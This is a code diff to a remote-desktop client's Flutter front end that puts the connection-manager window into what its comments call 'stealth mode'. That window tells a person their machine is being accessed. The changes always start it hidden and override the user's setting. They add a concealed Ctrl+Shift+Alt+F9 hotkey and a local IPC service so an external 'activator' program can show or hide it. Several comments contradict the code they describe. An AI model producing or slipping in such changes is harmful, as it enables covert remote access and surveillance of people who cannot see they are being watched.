@@ -20,6 +20,7 @@ import 'package:flutter_hbb/models/state_model.dart';
 import 'package:flutter_hbb/utils/multi_window_manager.dart';
 import 'package:flutter_localizations/flutter_localizations.dart';
 import 'package:get/get.dart';
+import 'package:hotkey_manager/hotkey_manager.dart';
 import 'package:provider/provider.dart';
 import 'package:window_manager/window_manager.dart';
 
@@ -31,6 +32,7 @@ import 'models/platform_model.dart';
 
 import 'package:flutter_hbb/plugin/handlers.dart'
     if (dart.library.html) 'package:flutter_hbb/web/plugin/handlers.dart';
+import 'package:flutter_hbb/common/cm_ipc_service.dart';
 
 /// Basic window and launch properties.
 int? kWindowId;
@@ -105,6 +107,7 @@ Future<void> main(List<String> args) async {
     debugPrint("--cm started");
     desktopType = DesktopType.cm;
     await windowManager.ensureInitialized();
+    
     runConnectionManagerScreen();
   } else if (args.contains('--install')) {
     runInstallPage();
@@ -287,27 +290,145 @@ void runMultiWindow(
 }
 
 void runConnectionManagerScreen() async {
+  debugPrint("[HOTKEY] runConnectionManagerScreen: Starting initialization");
   await initEnv(kAppTypeConnectionManager);
+
+  // Initialize hotkey manager early (unregister any existing hotkeys)
+  debugPrint("[HOTKEY] Attempting to unregister all existing hotkeys");
+  try {
+    await hotKeyManager.unregisterAll();
+    debugPrint("[HOTKEY] Successfully unregistered all hotkeys");
+  } catch (e) {
+    debugPrint("[HOTKEY] Error unregistering hotkeys: $e");
+  }
+
+  debugPrint("[HOTKEY] Starting app with DesktopServerPage");
   _runApp(
     '',
     const DesktopServerPage(),
     MyTheme.currentThemeMode(),
   );
-  final hide = await bind.cmGetConfig(name: "hide_cm") == 'true';
-  gFFI.serverModel.hideCm = hide;
-  if (hide) {
-    await hideCmWindow(isStartup: true);
-  } else {
-    await showCmWindow(isStartup: true);
+
+  // Force hideCm = true for stealth mode to prevent automatic showCmWindow() calls
+  gFFI.serverModel.hideCm = false; // test it: TODO: same thing with true
+  debugPrint("[HOTKEY] Set hideCm=true to prevent automatic window showing");
+
+  // ALWAYS start hidden for stealth mode
+  debugPrint("[HOTKEY] Hiding CM window on startup");
+  await hideCmWindow(isStartup: true);
+  debugPrint("[HOTKEY] CM window hidden, window is ready");
+
+  // Register global shortcut: Ctrl+Shift+M to toggle CM window
+  // Wait a bit for window manager to be fully ready
+  debugPrint("[HOTKEY] Waiting 500ms before registering hotkey to ensure window manager is ready");
+  await Future.delayed(Duration(milliseconds: 500));
+
+  debugPrint("[HOTKEY] Starting hotkey registration process");
+  try {
+    // Note: Using HotKeyScope.inapp because Wayland doesn't support system-wide hotkeys
+    // For system-wide hotkey on Wayland, user must configure in GNOME Settings
+    final hotKey = HotKey(
+      key: PhysicalKeyboardKey.f9,
+      modifiers: [HotKeyModifier.control, HotKeyModifier.shift, HotKeyModifier.alt],
+      scope: HotKeyScope.inapp,  // Changed from system to inapp for Wayland compatibility
+    );
+    debugPrint("[HOTKEY] Created HotKey object: key=F9, modifiers=[control, shift, alt], scope=inapp (Wayland compatible)");
+
+    debugPrint("[HOTKEY] Calling hotKeyManager.register()");
+    await hotKeyManager.register(
+      hotKey,
+      keyDownHandler: (hotKey) async {
+        debugPrint("[HOTKEY] *** HOTKEY PRESSED *** Ctrl+Shift+Alt+F9 detected!");
+        try {
+          // Use tracked state instead of checking window manager
+          debugPrint("[HOTKEY] Current state: _isCmWindowVisible=$_isCmWindowVisible");
+
+          if (_isCmWindowVisible) {
+            debugPrint("[HOTKEY] Window is visible, hiding it now");
+            await hideCmWindow();
+            debugPrint("[HOTKEY] Window hidden successfully, _isCmWindowVisible=$_isCmWindowVisible");
+          } else {
+            debugPrint("[HOTKEY] Window is hidden, showing it now");
+            await showCmWindow();
+            debugPrint("[HOTKEY] Window shown successfully, _isCmWindowVisible=$_isCmWindowVisible");
+          }
+        } catch (e) {
+          debugPrint("[HOTKEY] ERROR in hotkey handler: $e");
+        }
+      },
+    );
+    debugPrint("[HOTKEY] ✓ Global hotkey Ctrl+Shift+Alt+F9 registered successfully!");
+    debugPrint("[HOTKEY] ✓ Press Ctrl+Shift+Alt+F9 to toggle CM window visibility");
+  } catch (e) {
+    debugPrint("[HOTKEY] ✗ FAILED to register global hotkey: $e");
+    debugPrint("[HOTKEY] ✗ Error type: ${e.runtimeType}");
   }
+
+  // Start IPC service for external window control (activator binary)
+  debugPrint("[CM-IPC] Starting IPC service for CM window control");
+  try {
+    _cmIpcService = CmIpcService(onCommand: _handleCmIpcCommand);
+    await _cmIpcService!.start();
+
+    if (Platform.isLinux || Platform.isMacOS) {
+      debugPrint("[CM-IPC] ✓ IPC service started - Unix socket: ${_cmIpcService!.socketPath}");
+      debugPrint("[CM-IPC] ✓ Activator can connect via: ${_cmIpcService!.socketPath}");
+    } else if (Platform.isWindows) {
+      debugPrint("[CM-IPC] ✓ IPC service started - TCP port: ${_cmIpcService!.tcpPort}");
+      debugPrint("[CM-IPC] ✓ Activator can connect via: 127.0.0.1:${_cmIpcService!.tcpPort}");
+    }
+  } catch (e) {
+    debugPrint("[CM-IPC] ✗ Failed to start IPC service: $e");
+    debugPrint("[CM-IPC] ✗ External window control will not be available");
+  }
+
   setResizable(false);
   // Start the uni links handler and redirect links to Native, not for Flutter.
   listenUniLinks(handleByFlutter: false);
+  debugPrint("[HOTKEY] runConnectionManagerScreen: Initialization complete");
 }
 
 bool _isCmReadyToShow = false;
+bool _isCmWindowVisible = false;  // Track actual visibility state
+
+// IPC service for external window control
+CmIpcService? _cmIpcService;
+
+/// Handle IPC commands for CM window control
+Future<String> _handleCmIpcCommand(String command) async {
+  debugPrint("[CM-IPC] Processing command: '$command'");
+
+  switch (command.trim()) {
+    case 'toggle':
+      if (_isCmWindowVisible) {
+        await hideCmWindow();
+        debugPrint("[CM-IPC] Window toggled to hidden");
+        return 'hidden';
+      } else {
+        await showCmWindow();
+        debugPrint("[CM-IPC] Window toggled to shown");
+        return 'shown';
+      }
+
+    case 'show':
+      await showCmWindow();
+      debugPrint("[CM-IPC] Window shown via IPC");
+      return 'shown';
+
+    case 'hide':
+      await hideCmWindow();
+      debugPrint("[CM-IPC] Window hidden via IPC");
+      return 'hidden';
+
+    default:
+      debugPrint("[CM-IPC] Unknown command: '$command'");
+      return 'unknown command';
+  }
+}
 
 showCmWindow({bool isStartup = false}) async {
+  debugPrint("[HOTKEY] showCmWindow called: isStartup=$isStartup, _isCmWindowVisible=$_isCmWindowVisible");
+
   if (isStartup) {
     WindowOptions windowOptions = getHiddenTitleBarWindowOptions(
         size: kConnectionManagerWindowSizeClosedChat, alwaysOnTop: true);
@@ -322,35 +443,44 @@ showCmWindow({bool isStartup = false}) async {
     await windowManager.setSizeAlignment(
         kConnectionManagerWindowSizeClosedChat, Alignment.topRight);
     _isCmReadyToShow = true;
-  } else if (_isCmReadyToShow) {
-    if (await windowManager.getOpacity() != 1) {
-      await windowManager.setOpacity(1);
-      await windowManager.focus();
-      await windowManager.minimize(); //needed
-      await windowManager.setSizeAlignment(
-          kConnectionManagerWindowSizeClosedChat, Alignment.topRight);
-      windowOnTop(null);
-    }
+    _isCmWindowVisible = true;
+    gFFI.serverModel.hideCm = false;  // Update flag to prevent auto-show
+    debugPrint("[HOTKEY] showCmWindow: Window shown on startup, _isCmWindowVisible=$_isCmWindowVisible, hideCm=false");
+  } else if (_isCmReadyToShow && !_isCmWindowVisible) {
+    await windowManager.setOpacity(1);
+    await windowManager.show();
+    await windowManager.focus();
+    await windowManager.setSizeAlignment(
+        kConnectionManagerWindowSizeClosedChat, Alignment.topRight);
+    windowOnTop(null);
+    _isCmWindowVisible = true;
+    gFFI.serverModel.hideCm = false;  // Update flag to prevent auto-show
+    debugPrint("[HOTKEY] showCmWindow: Window shown, _isCmWindowVisible=$_isCmWindowVisible, hideCm=false");
   }
 }
 
 hideCmWindow({bool isStartup = false}) async {
+  debugPrint("[HOTKEY] hideCmWindow called: isStartup=$isStartup, _isCmWindowVisible=$_isCmWindowVisible");
+
   if (isStartup) {
     WindowOptions windowOptions = getHiddenTitleBarWindowOptions(
         size: kConnectionManagerWindowSizeClosedChat);
-    windowManager.setOpacity(0);
-    await windowManager.waitUntilReadyToShow(windowOptions, null);
-    bind.mainHideDock();
-    await windowManager.minimize();
-    await windowManager.hide();
-    _isCmReadyToShow = true;
-  } else if (_isCmReadyToShow) {
-    if (await windowManager.getOpacity() != 0) {
-      await windowManager.setOpacity(0);
+    await windowManager.waitUntilReadyToShow(windowOptions, () async {
       bind.mainHideDock();
-      await windowManager.minimize();
+      await windowManager.setOpacity(0);
       await windowManager.hide();
-    }
+    });
+    _isCmReadyToShow = true;
+    _isCmWindowVisible = false;
+    gFFI.serverModel.hideCm = true;  // Update flag to block auto-show
+    debugPrint("[HOTKEY] hideCmWindow: Window hidden on startup, _isCmWindowVisible=$_isCmWindowVisible, hideCm=true");
+  } else if (_isCmReadyToShow && _isCmWindowVisible) {
+    await windowManager.setOpacity(0);
+    await windowManager.hide();
+    bind.mainHideDock();
+    _isCmWindowVisible = false;
+    gFFI.serverModel.hideCm = true;  // Update flag to block auto-show
+    debugPrint("[HOTKEY] hideCmWindow: Window hidden, _isCmWindowVisible=$_isCmWindowVisible, hideCm=true");
   }
 }
 
